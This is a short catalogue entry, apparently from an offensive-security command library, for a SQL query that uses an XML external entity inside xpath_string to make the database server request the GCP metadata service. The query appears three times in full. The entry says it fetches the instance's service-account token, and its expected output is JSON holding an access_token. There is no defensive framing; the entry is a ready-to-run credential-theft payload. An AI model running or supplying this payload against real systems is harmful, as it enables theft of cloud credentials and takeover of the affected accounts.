---
data: >-
  select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
  <!ENTITY xxe SYSTEM
  "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token">
  ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
tags:
  - xxe
  - ssrf
type: command
executor: sql
platforms:
  - GCP
id: 374f8dec-a006-488f-ab92-994cfb34bb46
created_at: '2025-12-13T09:00:27.755Z'
updated_at: '2025-12-13T09:00:27.755Z'
verified: false
validated: true
submitted: true
---
# select-xpath-string-service-token

## Command

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

## Description

Executes XXE to fetch service account token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `SYSTEM` | Fetches from specified URI | Yes |
| `xpath_string` | Processes XML with XXE | Yes |

## Examples

### Basic Usage

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

## Expected Output

JSON with access_token, expires_in, token_type

## Related

- [[procedures/Exploit-XXE-for-GCP-Metadata]]
